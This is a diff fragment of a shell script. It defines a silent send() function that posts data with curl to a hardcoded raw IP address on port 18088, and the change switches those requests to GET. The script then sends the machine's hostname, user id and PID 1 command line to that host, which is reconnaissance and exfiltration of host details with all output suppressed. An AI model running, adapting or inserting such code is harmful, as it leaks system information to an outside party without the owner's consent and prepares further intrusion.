@@ -9,7 +9,7 @@ b64(){ base64 -w0 2>/dev/null || base64 | tr -d '\n'; }
 B='http://91.215.85.170:18088'
 L=/tmp/i328x.log
 : > "$L" 2>/dev/null
-send(){ echo "$1=$2" >> "$L" 2>/dev/null; curl -s -m 20 --data-urlencode "t=$NONCE-$1" --data-urlencode "d=$2" "$B" >/dev/null 2>&1; }
+send(){ echo "$1=$2" >> "$L" 2>/dev/null; curl -s -m 20 -G --data-urlencode "t=$NONCE-$1" --data-urlencode "d=$2" "$B" >/dev/null 2>&1; }
 
 send ident "$(uname -n)|$(hostname)|$(id -u)"
 send p1cmd "$(tr '\0' ' ' </proc/1/cmdline)"
